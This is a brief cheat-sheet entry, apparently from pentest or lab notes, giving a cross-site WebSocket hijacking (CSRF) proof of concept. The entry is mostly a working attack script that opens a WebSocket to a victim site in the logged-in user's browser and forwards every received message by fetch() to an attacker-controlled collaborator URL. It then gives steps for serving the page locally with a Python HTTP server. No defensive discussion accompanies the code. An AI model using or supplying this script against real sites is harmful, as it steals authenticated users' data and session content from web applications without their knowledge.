
### CSRF with web socket

Utilize this script in the attacker machine (note wss is used instead of https://):
```js
<script>
    var ws = new WebSocket('wss://your-websocket-url');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch('https://your-collaborator-url', {method: 'POST', mode: 'no-cors', body: event.data});
    };
</script>
```

This can be tested locally without exploit server by creating the following html file:
```html
<!DOCTYPE html>
<html>
<body>
*INSERT SCRIPT FROM CSRF POC*
</html>
</body>
```
Then kick off a python server:
```Python
python3 -m http.server 8008
```
In the logged in browser open a tab and navigate to the .html file. Should see it hit in collaborator.

